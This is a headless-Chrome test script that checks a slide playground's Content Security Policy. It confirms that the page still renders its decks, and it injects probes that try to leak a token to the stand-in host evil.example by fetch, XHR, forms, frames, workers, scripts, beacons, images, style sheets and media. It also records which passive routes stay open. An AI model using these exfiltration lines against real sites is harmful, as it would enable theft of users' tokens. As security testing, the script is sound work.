// The playground page's Content Security Policy, in headless Chrome: what it
// still lets through, and what it now refuses. Two halves.
//
//  1. The page works under it: it loads, renders the first deck, shows a deck
//     with a remote image and a remote style sheet in the preview frame, and
//     the export engine loads on the first export; no securitypolicyviolation
//     fires in the page or in any frame while it does.
//  2. What a script injected into the page could do with a token: send it by
//     fetch, XHR, a form, a frame, an object, a worker, a <base> or a script
//     from another origin is refused (a violation is reported for each). The
//     routes the policy cannot close are the passive sub-resources a deck links
//     (images, style sheets, media): the preview frames are srcdoc iframes and
//     inherit the page's policy, which must allow https for them. The test says
//     so by asserting it (a control: if this stops being true the comment in
//     layouts/_default/playground.html and the README are out of date).
//
//   node csp.cjs http://127.0.0.1:PORT/playground/
//
// CHROME names the browser; NODE_PATH finds puppeteer-core. Prints CSP_OK {...}.
"use strict";
const puppeteer = require("puppeteer-core");
const zlib = require("zlib");

const url = process.argv[2];
const fail = (m) => { console.error("FAIL " + m); process.exit(1); };
const link = (src) => url + "#deck=" + zlib.deflateRawSync(Buffer.from(src), { level: 9 }).toString("base64url");

// a deck whose preview links a remote image and a remote style sheet: both must
// be asked for by the preview frame (the request is answered by interception, so
// no network is needed)
const deck = "---\ntheme: default\nstyle: '@import url(https://styles.example/s.css);'\n---\n\n# CSP\n\n![](https://images.example/p.png)\n";

async function until(page, what, fn, arg, ms = 30000) {
  const end = Date.now() + ms;
  for (;;) {
    const v = await page.evaluate(fn, arg).catch(() => null);
    if (v) return v;
    if (Date.now() > end) fail("timed out waiting for " + what);
    await new Promise((r) => setTimeout(r, 25));
  }
}

(async () => {
  const browser = await puppeteer.launch({ executablePath: process.env.CHROME, headless: true, args: ["--no-sandbox", "--window-size=1440,900"] });
  const ctx = await browser.createBrowserContext();
  const page = await ctx.newPage();
  await page.setViewport({ width: 1440, height: 900, deviceScaleFactor: 1 });

  // every violation, in the page and in every frame (a srcdoc frame reports its own)
  const violations = [];
  page.on("console", (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text()); });
  const requested = [];
  await page.setRequestInterception(true);
  page.on("request", (r) => {
    const u = r.url();
    if (u.startsWith("https://images.example/")) { requested.push(u); return r.respond({ status: 200, contentType: "image/png", body: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==", "base64") }); }
    if (u.startsWith("https://styles.example/")) { requested.push(u); return r.respond({ status: 200, contentType: "text/css", body: "h1{color:rgb(1,2,3)}" }); }
    if (u.startsWith("https://evil.example/f.png")) requested.push(u);
    // the page's own origin (a local server, or the deployed site when the test is
    // pointed at it) is served for real; every other host is answered here
    if (u.startsWith(new URL(url).origin + "/")) return r.continue();
    return r.respond({ status: 200, contentType: "text/plain", body: "ok", headers: { "Access-Control-Allow-Origin": "*" } });
  });

  await page.goto(link(deck), { waitUntil: "load" });
  await until(page, "the editor", () => globalThis.webcanvasReady && globalThis.goSlidesReady && document.querySelector(".stage").classList.contains("ready"));
  await until(page, "the first preview", () => goSlidesDebug().loads >= 1 && !goSlidesDebug().busy);

  // 1. the preview frame reached its remote image and style sheet, and nothing was refused
  await new Promise((r) => setTimeout(r, 1500));
  if (!requested.some((u) => u.includes("images.example"))) fail("the preview frame did not request its image: " + JSON.stringify(requested));
  if (!requested.some((u) => u.includes("styles.example"))) fail("the preview frame did not request its style sheet: " + JSON.stringify(requested));
  const frame = page.frames().find((f) => f !== page.mainFrame());
  const text = frame ? await frame.evaluate(() => document.body.innerText).catch(() => "") : "";
  if (!text.includes("CSP")) fail("the preview shows " + JSON.stringify(text.slice(0, 60)));
  if (violations.length) fail("the page or its frame was refused something it needs: " + violations.join(" | "));

  // 2. what an injected script cannot do (a violation event for each), and the
  // one thing it can
  const probes = await page.evaluate(async () => {
    const seen = [];
    document.addEventListener("securitypolicyviolation", (e) => seen.push(e.effectiveDirective + " " + e.blockedURI));
    const settle = () => new Promise((r) => setTimeout(r, 150));
    const out = {};
    const attempt = async (name, fn) => { const before = seen.length; try { await fn(); } catch (e) {} await settle(); out[name] = seen.slice(before); };
    await attempt("fetch", () => fetch("https://evil.example/t?x=TOKEN"));
    await attempt("xhr", () => { const x = new XMLHttpRequest(); x.open("GET", "https://evil.example/t?x=TOKEN"); x.send(); });
    await attempt("form", () => { const f = document.createElement("form"); f.action = "https://evil.example/t"; f.method = "post"; document.body.appendChild(f); f.submit(); });
    await attempt("frame", () => { const i = document.createElement("iframe"); i.src = "https://evil.example/t?x=TOKEN"; document.body.appendChild(i); });
    await attempt("object", () => { const o = document.createElement("object"); o.data = "https://evil.example/t?x=TOKEN"; document.body.appendChild(o); });
    // a cross-origin worker is refused by the browser itself: the constructor throws
    out.worker = [];
    try { new Worker("https://evil.example/w.js"); } catch (e) { out.worker.push("throws " + e.name); }
    try { new Worker("blob:https://evil.example/x"); } catch (e) { out.worker.push("throws " + e.name); }
    await attempt("script", () => { const s = document.createElement("script"); s.src = "https://evil.example/s.js"; document.head.appendChild(s); });
    await attempt("import", () => import("https://evil.example/m.js"));
    await attempt("base", () => { const b = document.createElement("base"); b.href = "https://evil.example/"; document.head.appendChild(b); });
    await attempt("beacon", () => navigator.sendBeacon("https://evil.example/t", "x=TOKEN"));
    // the passive sub-resources a deck links: the preview frames inherit these
    await attempt("image", () => { new Image().src = "https://evil.example/i.png?x=TOKEN"; });
    await attempt("stylesheet", () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = "https://evil.example/s.css?x=TOKEN"; document.head.appendChild(l); });
    await attempt("media", () => { const a = document.createElement("audio"); a.src = "https://evil.example/a.mp3?x=TOKEN"; a.load(); });
    // the routes through a frame (go-slides#90): a srcdoc frame inherits the
    // page's policy, so it is as open as the page is; a frame loaded from a URL
    // has a policy of its own, which the page feeds (see the page's comment)
    await attempt("srcdocframe", () => { const i = document.createElement("iframe"); i.sandbox = "allow-scripts"; i.srcdoc = '<img src="https://evil.example/f.png?x=TOKEN">'; document.body.appendChild(i); });
    return out;
  });
  const need = ["fetch", "xhr", "form", "frame", "object", "worker", "script", "import", "base", "beacon"];
  for (const k of need) if (!probes[k] || probes[k].length === 0) fail("not refused: " + k + " " + JSON.stringify(probes));
  // the controls: an image, a style sheet or a media file from any https host is NOT
  // refused (a deck links such things, and the srcdoc preview frames inherit the
  // page's policy); if one is now refused, the note in the page and the README are
  // out of date
  const open = ["image", "stylesheet", "media"];
  // a violation inside the frame is not seen by the page's listener: the request
  // itself is the witness
  if (!requested.some((u) => u.startsWith("https://evil.example/f.png"))) console.error("note: a srcdoc frame's image request is now refused: update the comment in the page and the README");
  for (const k of open) if (probes[k].length !== 0) console.error("note: a " + k + " request is now refused (" + JSON.stringify(probes[k]) + "): update the comment in the page and the README");
  await browser.close();
  console.log("CSP_OK " + JSON.stringify({ refused: need, stillOpen: open.filter((k) => probes[k].length === 0), preview: requested.length }));
})().catch((e) => fail(e.stack || String(e)));
